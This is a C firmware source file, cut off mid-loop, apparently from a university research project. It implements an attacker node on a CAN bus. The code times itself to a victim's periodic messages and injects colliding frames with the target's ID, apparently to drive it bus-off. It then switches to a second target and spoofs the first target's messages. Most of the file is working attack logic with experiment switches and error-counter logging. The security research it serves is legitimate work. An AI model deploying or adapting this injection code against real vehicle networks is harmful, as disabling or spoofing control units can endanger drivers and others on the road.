
/*
 * Copyright (C) 2019, 2021 Regents of University of Colorado
 * Written by Gedare Bloom <gbloom@uccs.edu>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdint.h>
#include <stdbool.h>
#include "inc/hw_can.h"
#include "inc/hw_ints.h"
#include "inc/hw_memmap.h"
#include "inc/hw_types.h"
#include "driverlib/debug.h"
#include "driverlib/fpu.h"
#include "driverlib/can.h"
#include "driverlib/gpio.h"
#include "driverlib/interrupt.h"
#include "driverlib/pin_map.h"
#include "driverlib/rom.h"
#include "driverlib/rom_map.h"
#include "driverlib/sysctl.h"
#include "driverlib/timer.h"
#include "driverlib/uart.h"
#include "utils/uartstdio.h"

#include "saebench.h"
#include "experiment.h"


//----------------------------------------------------------------------------
// Modify anything below with care!
//----------------------------------------------------------------------------

// System clock rate in Hz, set in main() to 120 MHz
uint32_t g_ui32SysClock;
#define SYSCLK (120000000)
#define TICKS_PER_MS (SYSCLK/1000)
#define TICKS_PER_US (TICKS_PER_MS/1000)
#define TICKS_PER_BIT (SYSCLK/BITRATE)
#define INTERVAL (TICKS_PER_MS*5)   // 5 ms in 120 MHz ticks
#define LATENCY_8B_MAX (129*TICKS_PER_BIT) /* maximum message latency */

// counters
volatile uint32_t g_ui32RXMsgCount = 0;
volatile uint32_t g_ui32TXMsgCount = 0;

// flags used by interrupt handlers
volatile uint32_t g_ui32ErrFlag = 0;
volatile bool g_bRXFlag = 0;
volatile bool g_bTXFlag = 0;
volatile bool g_bTXFlag_5 = 0;
volatile bool g_bTXFlag_10 = 0;
volatile bool g_bTXFlag_100 = 0;
volatile bool g_bTXFlag_1000 = 0;
volatile bool g_bTXTarget_1 = 0;
volatile bool g_bTXTarget_2 = 0;
volatile bool g_bRESETFlag = 0;
volatile bool g_tick = false;
volatile bool g_tick_2 = false;

uint32_t g_last_target_rcv = 0;

/* Synchronization works on a simple state machine.
 * The initial state is SYNC_MODE_INIT. Transition goes from this state to SYNC_MODE RESET after some delay from start.
 * The reset state is SYNC_MODE_RESET. In this state, the attacker node attempts to resynchronize with the victim.
 * The adjustment state is SYNC_MODE_ADJUST. In this state, the attacker is resynchronizing to the victim by adjusting the periodic timers.
 * The synchronized state is SYNC_MODE_SYNCHED. This state is reached after the adjustment completes.
 */
#define SYNC_MODE_INIT       (0)
#define SYNC_MODE_SYNCHED    (1)
#define SYNC_MODE_RESYNCH    (2)    // UNUSED
#define SYNC_MODE_ADJUST     (3)
#define SYNC_MODE_RESET      (4)
volatile uint8_t g_sync = SYNC_MODE_INIT;

volatile bool g_reset = false;
volatile uint8_t g_msg_since_idle = 0;

// LED toggling states
volatile uint8_t g_pin0 = 0;
volatile uint8_t g_pin_2 = 0;

// keep track of interrupt event times
volatile uint32_t g_ui32LastCANIntTimer = 0;

// adds delay on reset
volatile uint32_t g_offset = 0;

// the (current) ID to attack
volatile uint32_t g_target_id = 0;
volatile uint32_t g_ui32TargetXmitTime = 0;
volatile uint8_t g_skip_attack = SKIP_ATTACK;

// Determine the relative priorities of the TARGET_ID, TARGET_ID_2, and the highest priority message normally sent.
/*
#if (HIGH_PRIO_ID < TARGET_ID && TARGET_ID < TARGET_ID_2)
#define PRIORITY_Target_1 (MID_PRIO)
#define HIGHEST_TX_PRIORITY (HIGH_PRIO)
#define PRIORITY_Target_2 (LOW_PRIO)
#elif (HIGH_PRIO_ID < TARGET_ID_2 && TARGET_ID_2 < TARGET_ID)
#define PRIORITY_Target_1 (LOW_PRIO)
#define HIGHEST_TX_PRIORITY (HIGH_PRIO)
#define PRIORITY_Target_2 (MID_PRIO)
#elif (TARGET_ID < HIGH_PRIO_ID  && HIGH_PRIO_ID < TARGET_ID_2)
#define PRIORITY_Target_1 (HIGH_PRIO)
#define HIGHEST_TX_PRIORITY (MID_PRIO)
#define PRIORITY_Target_2 (LOW_PRIO)
#elif (TARGET_ID_2 < HIGH_PRIO_ID  && HIGH_PRIO_ID < TARGET_ID)
#define PRIORITY_Target_1 (LOW_PRIO)
#define HIGHEST_TX_PRIORITY (MID_PRIO)
#define PRIORITY_Target_2 (HIGH_PRIO)
#elif (TARGET_ID < TARGET_ID_2)
#define PRIORITY_Target_1 (HIGH_PRIO)
#define HIGHEST_TX_PRIORITY (LOW_PRIO)
#define PRIORITY_Target_2 (MID_PRIO)
#else
#define PRIORITY_Target_1 (MID_PRIO)
#define HIGHEST_TX_PRIORITY (LOW_PRIO)
#define PRIORITY_Target_2 (HIGH_PRIO)
#endif
*/
#define PRIORITY_Target_1 (MID_PRIO)
#define HIGHEST_TX_PRIORITY (HIGH_PRIO)
#define PRIORITY_Target_2 (LOW_PRIO)

#define RXOBJECT_RESET      14
#define TXOBJECT_RESET      RXOBJECT_RESET
#define TXOBJECT_5          HIGHEST_TX_PRIORITY
#define TXOBJECT_Target_1   PRIORITY_Target_1
#define TXOBJECT_Target_2   PRIORITY_Target_2
#define TXOBJECT_RESERVED1  6
#define TXOBJECT_RESERVED2  7
#define TXOBJECT_10         9
#define TXOBJECT_100        11
#define TXOBJECT_RESERVED3  12
#define TXOBJECT_1000       13

#define RXOBJECT_RESERVED1  15
#define RXOBJECT            16

void do_attack_injection(void);


// The error routine that is called if the driver library encounters an error.
#ifdef DEBUG
void
__error__(char *pcFilename, uint32_t ui32Line)
{
}
#endif

void delay_ticks(uint32_t ticks)
{
    uint32_t start = 0;
    uint32_t end = 1;
    // in case of an overflow.
    while (end >= start) { // loop in case of an overflow
        start = TimerValueGet(TIMER3_BASE, TIMER_A);
        end = start - ticks; // timer3 is a free-running, countdown timer.
    }
    while (start > end) {
        start = TimerValueGet(TIMER3_BASE, TIMER_A);
    }
}

void delay_us(uint32_t delay)
{
    delay_ticks(delay*TICKS_PER_US);
}

void delay_ms(uint32_t delay)
{
    delay_us(delay*1000);
}

static inline void got_CAN_msg_interrupt(uint32_t ID)
{
    uint32_t timer_val;

    if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
        g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);
    } else {
        if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
            // no sync, attack --> preceded message injection
            if ((PRECEDED_ID == ID && g_target_id == TARGET_ID) || (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2)) {
                do_attack_injection();
            }
        }
    }

    switch(ID) {
        case RXOBJECT: g_bRXFlag = true; break;
#if defined(SEND_RESET)
        case TXOBJECT_RESET: g_bRESETFlag = true; break;
#endif
        case TXOBJECT_5: g_bTXFlag_5 = true; break;
        case TXOBJECT_Target_1: g_bTXTarget_1 = true; break;
        case TXOBJECT_Target_2: g_bTXTarget_2 = true; break;
        case TXOBJECT_10: g_bTXFlag_10 = true; break;
        case TXOBJECT_100: g_bTXFlag_100 = true; break;
        case TXOBJECT_1000: g_bTXFlag_1000 = true; break;
        default: g_bTXFlag = ID; break;
    }

    // This intends to count the number of messages since the last bus idle time.
    // TODO: It is a crude hack that may need tuning by changing the LATENCY definition.
    // A more clever solution would derive the expected timer value based on the length of
    // the received message, but we won't actually know that until (a) after that message is
    // received and (b) when the RX buffer is read in the main() busy-loop.
    if (g_ui32ExpCtrl & SYNC_0PHASE) {
        if (g_sync == SYNC_MODE_RESET) {
            timer_val = TimerValueGet(TIMER2_BASE, TIMER_A);
            if (g_target_id == TARGET_ID) {
                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME);
            } else {
                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME_2);
            }
            TimerEnable(TIMER2_BASE, TIMER_A);
            if (timer_val == 0) {
                g_msg_since_idle = 0;
            } else {
                g_msg_since_idle++;
            }
        }
    }

}

void CAN0IntHandler(void)
{
    uint32_t ui32Status;

    IntMasterDisable();

    while ((ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE)) != 0) {

        if(ui32Status == CAN_INT_INTID_STATUS) {
            ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);

            // if using abort on txerror, check for the tx error condition on the target ID
            // if an error occurs, just cancel the transmission blindly.
            if (g_ui32ExpCtrl & DISABLE_RETRANS_TXERR) {
                //uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
                //if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
                if (ui32Status & CAN_STATUS_LEC_MSK) {
                    if (g_target_id == TARGET_ID ) {
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
                    } else if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
                    }
                }
            }

            // Errors are handled in CANErrorHandler().
            g_ui32ErrFlag |= ui32Status;
        } else {
            got_CAN_msg_interrupt(ui32Status);
            CANIntClear(CAN0_BASE, ui32Status);
        }
    }
    IntMasterEnable();
}

void do_attack_injection()
{
    static uint16_t skip_cnt = 0;

    if ( skip_cnt % g_skip_attack == 0 ) {
        if ( g_target_id == TARGET_ID ) {
            CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
        } else {
            if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
            }
        }
    }
    ++skip_cnt;
}

void send_messages(uint32_t count)
{
    if (g_reset == false) {
        if (HIGH_PRIO_ID < g_target_id ) {
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
            if (g_ui32ExpCtrl & ATTACK_MASK) {
                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE) && g_sync == SYNC_MODE_SYNCHED) {
                    do_attack_injection();
                }
            }
        } else {
            if (g_ui32ExpCtrl & ATTACK_MASK) {
                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE) && g_sync == SYNC_MODE_SYNCHED) {
                    do_attack_injection();
                }
            }
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
        }

        // spoof the first target's messages after transition, assume it is always a 5 or 10 ms periodic message...
        if ((g_ui32ExpCtrl & ATTACK_TRANSITIVE) && g_target_id == TARGET_ID_2 ) {
            if (TARGET_ID < 0xAF || count % 2 == 0) {
                CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
            }
        }

        if ( count % 2 == 0 && g_sCAN0TxMessage_10) {
            CANMessageSet(CAN0_BASE, TXOBJECT_10, g_sCAN0TxMessage_10, MSG_OBJ_TYPE_TX);
        }

        if (count % 20 == 0 && g_sCAN0TxMessage_100) {
            CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_100, MSG_OBJ_TYPE_TX);
        }

        if ( count % 200 == 0 ) {
            g_pin0 ^= 1;
            GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_pin0);
            if (g_sCAN0TxMessage_1000) {
                CANMessageSet(CAN0_BASE, TXOBJECT_1000, g_sCAN0TxMessage_1000, MSG_OBJ_TYPE_TX);
            }
        }
    }

#if defined(SEND_RESET)
#define SECONDS(x) (200*x)
#define RESET_PERIOD SECONDS(RESET_PERIOD_SECONDS)
    if ( count % RESET_PERIOD == 0 ) {
        g_ui8TXMsgData_RESET[0] = (g_ui8TXMsgData_RESET[0] + 1) % 256;
        CANMessageSet(CAN0_BASE, TXOBJECT_RESET, &g_sCAN0TxMessage_RESET, MSG_OBJ_TYPE_TX);
    }
#endif

}

void send_messages_2(uint32_t count)
{
    if ( count % 200 == 0 ) {
        g_pin_2 ^= 1;
        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, g_pin_2);
    }
}

void Timer0IntHandler(void)
{
    TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
    g_tick = true;

#if 0
    if (g_ui32ExpCtrl & (SYNC_0PHASE | SYNC_PERIOD)) {
        if (g_sync == SYNC_MODE_RESYNCH) {
            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
            g_sync = SYNC_MODE_SYNCHED;
        }
    } else {
        g_sync = SYNC_MODE_SYNCHED;
    }
#endif
}

void Timer1IntHandler(void)
{
    //uint32_t count;

    TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
    g_tick_2 = true;

    //TimerEnable(TIMER0_BASE, TIMER_A);
}

void Timer2IntHandler(void)
{
    TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
    TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
    TimerEnable(TIMER0_BASE, TIMER_A);
    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
    //TimerEnable(TIMER1_BASE, TIMER_A);
    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);

    if (g_sync == SYNC_MODE_INIT) {
        TimerLoadSet(TIMER2_BASE, TIMER_A, LATENCY_8B_MAX);
        TimerEnable(TIMER2_BASE, TIMER_A);
        g_sync = SYNC_MODE_RESET;
    } else if (g_sync == SYNC_MODE_ADJUST) {
        TimerDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
        g_sync = SYNC_MODE_SYNCHED;
        g_tick = true;  // TODO maybe too much jitter for the first injection?
    } else {
        // this really shouldn't happen, but let's poll timer 2.
        TimerLoadSet(TIMER2_BASE, TIMER_A, LATENCY_8B_MAX);
    }
}

void ResetCAN0(void)
{
    CANInit(CAN0_BASE);

    if (g_ui32ExpCtrl & DISABLE_RETRANS_AUTO) {
        CANRetrySet(CAN0_BASE, false);
    }

    CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);
    CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);
    IntEnable(INT_CAN0);
    CANEnable(CAN0_BASE);
    CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);
}

void InitCAN0(void)
{
    // CAN0 uses GPIO ports A0 and A1.
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);
    GPIOPinConfigure(GPIO_PA0_CAN0RX);
    GPIOPinConfigure(GPIO_PA1_CAN0TX);
    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);
    ResetCAN0();
}

void
CANErrorHandler(void)
{

    if (g_ui32ErrFlag & CAN_STATUS_BUS_OFF) {
        uint32_t ui32Status;

        UARTprintf("ERROR: CAN_STATUS_BUS_OFF\n");

        // on bus-off, set an LED pin and reset
        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 1);
        CANEnable(CAN0_BASE);
        do {
            ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);
        } while ( ui32Status & CAN_STATUS_BUS_OFF);
        g_reset = true;     // this disables any more attacking until a RESET happens

        // turn off the LED after recovery
        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 0);

        g_ui32ErrFlag &= ~(CAN_STATUS_BUS_OFF);
    }

    if (g_ui32ErrFlag & CAN_STATUS_EWARN) {
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);
        g_ui32ErrFlag &= ~(CAN_STATUS_EWARN);
    } else {
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 0);
    }

    if (g_ui32ErrFlag & CAN_STATUS_EPASS) {
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);
        g_ui32ErrFlag &= ~(CAN_STATUS_EPASS);
    }

    if (g_ui32ErrFlag & CAN_STATUS_RXOK) {
        g_ui32ErrFlag &= ~(CAN_STATUS_RXOK);
    }

    if (g_ui32ErrFlag & CAN_STATUS_TXOK) {
        g_ui32ErrFlag &= ~(CAN_STATUS_TXOK);
    }

    if (g_ui32ErrFlag & CAN_STATUS_LEC_STUFF) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_STUFF);
    }

    if(g_ui32ErrFlag & CAN_STATUS_LEC_FORM) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_FORM);
    }

    if(g_ui32ErrFlag & CAN_STATUS_LEC_ACK) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_ACK);
    }

    if (g_ui32ErrFlag & CAN_STATUS_LEC_BIT1) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT1);
    }

    if (g_ui32ErrFlag & CAN_STATUS_LEC_BIT0) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT0);
    }

    if (g_ui32ErrFlag & CAN_STATUS_LEC_CRC) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_CRC);
    }

    if (g_ui32ErrFlag & CAN_STATUS_LEC_MASK) {
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MASK);
    }

    if (g_ui32ErrFlag != 0) {
#if defined(VERBOSE)
        UARTprintf("ERROR: Unknown/Unhandled: %x \n",g_ui32ErrFlag);
#endif
    }
}

void
ConfigureUART2(void)
{
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOD);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_UART2);
    GPIOPinConfigure(GPIO_PD4_U2RX);
    GPIOPinConfigure(GPIO_PD5_U2TX);
    GPIOPinTypeUART(GPIO_PORTD_BASE, GPIO_PIN_4 | GPIO_PIN_5);
    UARTStdioConfig(2, 115200, g_ui32SysClock);
}

void do_reset(int count, int count_2, uint32_t offset)
{
    g_offset = offset;
    TimerDisable(TIMER0_BASE, TIMER_A);
    TimerDisable(TIMER1_BASE, TIMER_A);
    TimerDisable(TIMER2_BASE, TIMER_A);
    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
    IntDisable(INT_CAN0);
    CANDisable(CAN0_BASE);

    if (g_ui32ExpCtrl & RESET_IMMED) {
        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
        TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
        TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
        g_sync = SYNC_MODE_RESET;
    } else if (g_ui32ExpCtrl & RESET_DELAY) {
        TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL + (offset<<17)<<1);
        TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
        TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
        g_sync = SYNC_MODE_INIT;
    }

    g_tick = g_tick_2 = false;
    g_bTXTarget_1 = g_bTXTarget_2 = false;
    g_bTXFlag_5 = g_bTXFlag = g_bRXFlag = false;

    g_pin0 = g_pin_2 = 0;
    g_target_id = TARGET_ID;
    g_ui32TargetXmitTime = TARGET_XMIT_TIME;

    if (g_ui32ExpCtrl & ATTACK_MASK) {
        g_skip_attack = SKIP_ATTACK;
    }

    ResetCAN0();

    UARTprintf("\tRESET\t%d\t%d\n", count, count_2);

    if (g_ui32ExpCtrl & SYNC_0PHASE) {
        g_msg_since_idle = 10;
    }

    TimerEnable(TIMER0_BASE, TIMER_A);
    //TimerEnable(TIMER1_BASE, TIMER_A);
    TimerEnable(TIMER2_BASE, TIMER_A);
    g_reset = false;
}

void
initialize(void)
{
    //
    // Enable lazy stacking for interrupt handlers.  This allows floating-point
    // instructions to be used within interrupt handlers, but at the expense of
    // extra stack usage.
    //
    //FPULazyStackingEnable();

    g_ui32SysClock = SysCtlClockFreqSet((SYSCTL_XTAL_25MHZ | SYSCTL_OSC_MAIN | SYSCTL_USE_PLL | SYSCTL_CFG_VCO_480), SYSCLK);

    // enable LEDs
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPION);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOF);

    // configure LEDs
    GPIOPinTypeGPIOOutput(GPIO_PORTN_BASE, GPIO_PIN_0 | GPIO_PIN_1);
    GPIOPinTypeGPIOOutput(GPIO_PORTF_BASE, GPIO_PIN_0 | GPIO_PIN_4);

    // Enable timer peripherals
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER0);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER1);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER2);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER3);

    IntMasterEnable();

    // Setup timers
    // TIMER0 is a full width periodic timer at 5 ms period (determined by INTERVAL)
    TimerConfigure(TIMER0_BASE, TIMER_CFG_PERIODIC);
    TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER0A);
    TimerIntEnable(TIMER0_BASE, TIMER_TIMA_TIMEOUT);

    // TIMER1 provides a second 5 ms period timer that is (semi) independent from TIMER 1
    TimerConfigure(TIMER1_BASE, TIMER_CFG_PERIODIC);
    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER1A);
    TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    // TIMER2 is used for re-synchronization: 0-phase interval tracking and generating offsets during restart
    TimerConfigure(TIMER2_BASE, TIMER_CFG_ONE_SHOT);
    TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER2A);
    TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);

    TimerConfigure(TIMER3_BASE, TIMER_CFG_PERIODIC);
    TimerLoadSet(TIMER3_BASE, TIMER_A, 0x10000000);

    g_target_id = TARGET_ID;
    g_ui32TargetXmitTime = TARGET_XMIT_TIME;

    // Setup the CAN and UART
    InitCAN0();
    ConfigureUART2();
}

void
do_switch(int count)
{
    uint32_t rec, tec;
    CANErrCntrGet(CAN0_BASE, &rec, &tec);
    if (rec + tec > 0) return;

    UARTprintf("%d\tSWITCH\n", count);
    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
    g_target_id = TARGET_ID_2;
    g_ui32TargetXmitTime = TARGET_XMIT_TIME_2;
    g_sync = SYNC_MODE_RESET;
    if (g_ui32ExpCtrl & SYNC_0PHASE) {
        g_msg_since_idle = 10;
    }
    g_skip_attack = SKIP_ATTACK_2;
}

void
got_tx_message(int ID, int count)
{
    uint32_t rec, tec;

    g_ui32TXMsgCount++;

    if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
        if (PRECEDED_ID == ID && g_target_id == TARGET_ID) {
            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
            CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
        } else if (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2) {
            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
            CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
        }
    }

    if (g_target_id == ID) {
        CANErrCntrGet(CAN0_BASE, &rec, &tec);
        UARTprintf("%d\tATK-TX %d\tREC\t%u\tTEC\t%u\n", count, ID, rec, tec);
    }
#if defined(VERBOSE)
            CANErrCntrGet(CAN0_BASE, &rec, &tec);
            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
#endif
}

int
got_rx_message(int ID, int count)
{
    int rv = count;
    uint32_t rec, tec;

    if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
        if (!(g_ui32ExpCtrl & SYNC_MASK)) {
            // no sync, attack --> preceded message injection
            if ((PRECEDED_ID == ID && g_target_id == TARGET_ID) || (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2)) {
                do_attack_injection();
            }
        }
    }

    if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
        uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
        // INTERVAL << 4 is Magic.
        if (g_target_id == TARGET_ID && g_last_target_rcv && g_last_target_rcv - now > (INTERVAL<<2)) {
            // more magic... sometimes it switches early, so ignore the startup
            if (count > 200) {
                do_switch(count);
            }
        }
        // Disable retransmission of the attack when the preceded message is received
        // TODO: predict when the target will be bus-off?
        if ( PRECEDED_ID != HIGH_PRIO_ID && g_target_id == TARGET_ID ) {
            if (ID == PRECEDED_ID ) {
                delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
            }
        } else if (PRECEDED_ID_2 != HIGH_PRIO_ID && g_target_id == TARGET_ID_2) {
            if (ID == PRECEDED_ID_2 ) {
                delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
            }
        } else {
            // do nothing.
        }
    }

    if (ID == g_target_id) {
        g_last_target_rcv = TimerValueGet(TIMER3_BASE, TIMER_A);
        // check if need to resynchronize
        if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
            if (g_sync != SYNC_MODE_SYNCHED) {
                if (g_sync == SYNC_MODE_RESET && g_msg_since_idle == 0) { /* g_msg_since_idle always 0 with SYNC_PERIOD */
                    TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
                    uint32_t delta = g_ui32LastCANIntTimer - g_last_target_rcv; // counting down, so start - end = delta
                    TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL-delta-(TARGET_XMIT_TIME*11/2)); /* FIXME: 6 is magic. */
                    TimerEnable(TIMER2_BASE, TIMER_A);
                    g_sync = SYNC_MODE_ADJUST;
                    TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
                    TimerDisable(TIMER0_BASE, TIMER_A);
                    g_tick = false;
                    rv = 0;
                }
            }
        }
    }
#if defined(VERBOSE)
    // FIXME: print received target1 and target2 messages after attack presumed successful.
        CANErrCntrGet(CAN0_BASE, &rec, &tec);
        UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
#endif
    return rv;
}

int
main(void)
{
    int count = 0, count_2 = 0;
    volatile uint32_t delay = 0;

    initialize();


    // Start the clocks
    TimerEnable(TIMER0_BASE, TIMER_A);
    // TimerEnable(TIMER1_BASE, TIMER_A);
    // TimerEnable(TIMER2_BASE, TIMER_A);
    TimerEnable(TIMER3_BASE, TIMER_A);

    // Whenever the "RESET" node reboots, reset everyone else.
#if defined(SEND_RESET)
    CANMessageSet(CAN0_BASE, TXOBJECT_RESET, &g_sCAN0TxMessage_RESET, MSG_OBJ_TYPE_TX);
#endif

    // main loop
    while(1) {
        if (g_bRESETFlag) {
            g_bRESETFlag = false;
            // this flag is set when this node transmitted the reset message
            do_reset(count, count_2, g_ui8TXMsgData_RESET[0]);
            count = count_2 = 0;
            g_last_target_rcv = 0;
        }

        if (g_tick == true) {
            g_tick = false;
            send_messages(++count);
        }

        if (g_tick_2 == true) {
            g_tick_2 = false;
         //   send_messages_2(++count_2);
        }

        if (g_bTXTarget_1) {
            g_bTXTarget_1 = false;
            if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                if (g_target_id == TARGET_ID) {
                    do_switch(count);
                } else {
                    if (PRECEDED_ID_2 == TARGET_ID) {
                        if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
                            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                            CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
                        }
                    }
                }
            }
            got_tx_message(TARGET_ID, count);
        }

        if (g_bTXTarget_2) {
            g_bTXTarget_2 = false;
            got_tx_message(TARGET_ID_2, count);
        }

        if (g_bTXFlag_5) {
            g_bTXFlag_5 = false;
            got_tx_message(TX_5_ID, count);
        }

        if (g_bTXFlag_10) {
            g_bTXFlag_10 = false;
            g_ui32TXMsgCount++;
            got_tx_message(TX_10_ID, count);
        }

        if (g_bTXFlag_100) {
            g_bTXFlag_100 = false;
            got_tx_message(TX_100_ID, count);
        }

        if (g_bTXFlag_1000) {
            g_bTXFlag_1000 = false;
            g_ui32TXMsgCount++;
            got_tx_message(TX_1000_ID, count);
        }

        if (g_bTXFlag) {
            g_bTXFlag = false;
            g_ui32TXMsgCount++;
